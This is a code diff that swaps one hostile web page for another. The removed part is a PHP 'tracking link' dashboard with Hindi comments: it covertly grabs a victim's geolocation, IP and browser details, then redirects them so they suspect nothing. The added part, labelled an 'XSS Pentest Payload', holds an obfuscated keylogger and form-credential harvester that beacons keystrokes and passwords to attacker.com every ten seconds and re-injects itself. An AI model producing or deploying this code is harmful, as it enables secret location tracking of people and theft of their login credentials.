@@ -1,112 +1,73 @@
- <?php
-session_start();
-$filename = 'locations.json';
-
-// 1. Data Save Karne Ka Logic
-if (isset($_POST['lat']) && isset($_POST['lng'])) {
-    $data = [
-        'lat' => htmlspecialchars($_POST['lat']),
-        'lng' => htmlspecialchars($_POST['lng']),
-        'accuracy' => htmlspecialchars($_POST['accuracy']),
-        'ip' => $_SERVER['REMOTE_ADDR'],
-        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
-        'timestamp' => date('Y-m-d H:i:s')
-    ];
-    
-    $locations = file_exists($filename) ? json_decode(file_get_contents($filename), true) : [];
-    $locations[] = $data;
-    file_put_contents($filename, json_encode($locations));
-    
-    echo json_encode(['status' => 'success']);
-    exit;
-}
-
-// 2. Data Read Karne Ka Logic
-$locations = file_exists($filename) ? json_decode(file_get_contents($filename), true) : [];
-$locations = array_reverse($locations); // Latest location sabse upar dikhegi
-?>
-
-<!DOCTYPE html>
-<html lang="hi">
+ <!DOCTYPE html>
+<html>
 <head>
+    <title>XSS Pentest Payload</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📍 Live Location Dashboard</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; background: #f0f2f5; }
-        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px; }
-        .track-link-box { background: #e7f3ff; border: 1px solid #b2d4ff; padding: 15px; border-radius: 8px; display: flex; gap: 10px; }
-        input#trackUrl { flex-grow: 1; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
-        button { cursor: pointer; border: none; border-radius: 5px; transition: 0.3s; }
-        .copy-btn { background: #1877f2; color: white; padding: 10px 20px; }
-        .location-item { background: white; border-left: 5px solid #1877f2; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .coords { font-size: 18px; font-weight: bold; color: #1c1e21; }
-        .map-link { display: inline-block; margin-top: 10px; padding: 8px 15px; background: #42b72a; color: white; text-decoration: none; border-radius: 5px; font-size: 14px; }
-        .fresh { border-left-color: #2ecc71; background: #f6fff9; }
-    </style>
 </head>
 <body>
-
-    <div class="card">
-        <h2>🔗 Your Tracking Link</h2>
-        <p>Is link ko victim ko bhejo:</p>
-        <div class="track-link-box">
-            <input type="text" id="trackUrl" readonly>
-            <button class="copy-btn" onclick="copyLink()">📋 Copy</button>
-        </div>
+    <div id="payload" style="display:none;">
+        <script>
+            // Obfuscated XSS Payload - Multi-stage execution
+            (function(){
+                var _0x1a2b=['createElement','body','appendChild','innerHTML','http://attacker.com/steal.php?data=','encodeURIComponent','addEventListener','keydown','key','shiftKey','ctrlKey','altKey','charCodeAt','push','join','send','XMLHttpRequest','open','POST','setRequestHeader','Content-type','application/x-www-form-urlencoded','send','getElementById','value','focus','select'];
+                
+                function _0x3c4d(a){return document[_0x1a2b[0]](a);}
+                function _0x5e6f(b){return document[_0x1a2b[1]][_0x1a2b[2]](b);}
+                
+                // Stage 1: Keylogger Initialization
+                var k=[],t=new Date().getTime();
+                document[_0x1a2b[6]](_0x1a2b[7],function(e){
+                    var c=e[_0x1a2b[9]]?'S':'';c+=e[_0x1a2b[10]]?'C':'';c+=e[_0x1a2b[11]]?'A':'';
+                    k[_0x1a2b[13]](c+(String.fromCharCode(e[_0x1a2b[12]](0))));
+                });
+                
+                // Stage 2: Credential Harvester
+                function stealData(){
+                    var forms=document.forms,u=[],i=0;
+                    while(forms[i]){
+                        var f=forms[i],inputs=f.querySelectorAll('input[type="password"],input[type="email"],input[type="text"]');
+                        for(var j=0;j<inputs.length;j++){
+                            u[_0x1a2b[13]](inputs[j][_0x1a2b[23]]||'');
+                        }
+                        i++;
+                    }
+                    return u[_0x1a2b[14]]('|');
+                }
+                
+                // Stage 3: Exfiltration (Beaconing every 10s)
+                setInterval(function(){
+                    var data={
+                        keys:k[_0x1a2b[14]]('|'),
+                        creds:stealData(),
+                        url:window.location.href,
+                        ts:(new Date().getTime()-t)/1000
+                    };
+                    
+                    var x=new XMLHttpRequest();
+                    x[_0x1a2b[16]](_0x1a2b[17],'POST',_0x1a2b[4]+encodeURIComponent(JSON.stringify(data)));
+                    x[_0x1a2b[19]](_0x1a2b[20],_0x1a2b[21]);
+                    x[_0x1a2b[22]](null);
+                    k=[]; // Clear buffer
+                },10000);
+                
+                // Stage 4: Persistence & Stealth
+                var s=_0x3c4d('script');s.textContent='('+arguments.callee+')()';
+                _0x5e6f(s);
+                
+                // Auto-focus inputs for better capture
+                setTimeout(function(){
+                    var inputs=document.querySelectorAll('input');
+                    inputs.forEach(function(i){i[_0x1a2b[24]]();i[_0x1a2b[25]]();});
+                },1000);
+                
+            })();
+        </script>
     </div>
-
-    <h2>📱 Tracked Locations (Live)</h2>
-    <div id="locationList">
-        <?php if (empty($locations)): ?>
-            <p>Abhi tak koi data nahi mila...</p>
-        <?php else: ?>
-            <?php foreach (array_slice($locations, 0, 10) as $loc): ?>
-                <div class="location-item">
-                    <div class="coords">📍 Lat: <?= $loc['lat'] ?> | Lng: <?= $loc['lng'] ?></div>
-                    <div style="font-size: 12px; color: gray; margin-top: 5px;">
-                        Accuracy: <?= $loc['accuracy'] ?>m | Time: <?= $loc['timestamp'] ?>
-                    </div>
-                    <a href="https://www.google.com/maps?q=<?= $loc['lat'] ?>,<?= $loc['lng'] ?>" target="_blank" class="map-link">🗺️ View on Map</a>
-                </div>
-            <?php endforeach; ?>
-        <?php endif; ?>
+    
+    <!-- Visual indicator for pentest (remove in production testing) -->
+    <div style="position:fixed;bottom:10px;right:10px;background:linear-gradient(45deg,#ff0000,#ff4444);color:white;padding:10px;border-radius:5px;font-family:monospace;font-size:12px;z-index:99999;">
+        PENTEST ACTIVE | Keys: <span id="keycount">0</span> | <span style="color:#00ff00">HackerAI Payload</span>
     </div>
-
-    <script>
-        // 1. Tracking Link Auto-Generate
-        document.getElementById('trackUrl').value = window.location.origin + window.location.pathname + '?track=1';
-
-        function copyLink() {
-            var copyText = document.getElementById("trackUrl");
-            copyText.select();
-            navigator.clipboard.writeText(copyText.value);
-            alert("Link Copy Ho Gaya!");
-        }
-
-        // 2. Invisible Tracking Logic
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.has('track')) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    const formData = new FormData();
-                    formData.append('lat', pos.coords.latitude);
-                    formData.append('lng', pos.coords.longitude);
-                    formData.append('accuracy', pos.coords.accuracy);
-
-                    fetch('index.php', { method: 'POST', body: formData })
-                    .then(() => {
-                        // Success ke baad redirect kar sakte ho taaki shak na ho
-                        window.location.href = "https://www.google.com"; 
-                    });
-                }, null, { enableHighAccuracy: true });
-            }
-        }
-
-        // 3. Page Auto-Refresh (har 15 second mein)
-        if (!urlParams.has('track')) {
-            setInterval(() => { location.reload(); }, 15000);
-        }
-    </script>
+    <script>document.getElementById('keycount').innerHTML=0; // Counter placeholder</script>
 </body>
 </html>
